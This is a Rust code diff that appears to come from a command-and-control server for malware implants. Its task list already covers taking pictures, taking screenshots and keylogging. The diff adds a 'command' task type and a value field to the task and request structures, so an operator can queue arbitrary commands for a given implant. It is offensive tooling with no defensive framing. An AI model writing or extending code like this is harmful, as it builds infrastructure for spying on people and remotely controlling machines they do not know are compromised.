@@ -13,6 +13,7 @@ pub enum Tasks {
     TakePicture,
     TakeScreenshot,
     Keylogger,
+    Command,
 }
 
 impl FromStr for Tasks {
@@ -24,6 +25,7 @@ impl FromStr for Tasks {
             "take_picture" => Ok(Tasks::TakePicture),
             "take_screenshot" => Ok(Tasks::TakeScreenshot),
             "keylogger" => Ok(Tasks::Keylogger),
+            "command" => Ok(Tasks::Command),
             _ => Err(()),
         }
     }
@@ -36,6 +38,7 @@ impl FromStr for Tasks {
 pub struct Task {
     pub task_id: uuid::Uuid,
     pub task: String,
+    pub value: Option<String>,
     pub task_created_at: chrono::NaiveDateTime,
     pub task_status: String,
     pub result_content: Option<String>,
@@ -45,10 +48,16 @@ pub struct Task {
 }
 
 impl Task {
-    pub fn new(task: String, task_status: String, implant_id: uuid::Uuid) -> Self {
+    pub fn new(
+        task: String,
+        value: Option<String>,
+        task_status: String,
+        implant_id: uuid::Uuid,
+    ) -> Self {
         Task {
             task_id: uuid::Uuid::new_v4(),
             task,
+            value,
             task_created_at: chrono::Local::now().naive_local(),
             task_status,
             result_content: None,
@@ -63,20 +72,28 @@ impl Task {
 pub struct AddTaskRequest {
     pub implant_id: uuid::Uuid,
     pub task: String,
+    pub value: String,
 }
 
 #[derive(Debug, Serialize)]
 pub struct ResponseTask {
     pub task_id: uuid::Uuid,
     pub task: String,
+    pub value: Option<String>,
     pub implant_id: uuid::Uuid,
 }
 
 impl ResponseTask {
-    pub fn new(task_id: uuid::Uuid, task: String, implant_id: uuid::Uuid) -> Self {
+    pub fn new(
+        task_id: uuid::Uuid,
+        value: Option<String>,
+        task: String,
+        implant_id: uuid::Uuid,
+    ) -> Self {
         ResponseTask {
             task_id,
             task,
+            value,
             implant_id,
         }
     }
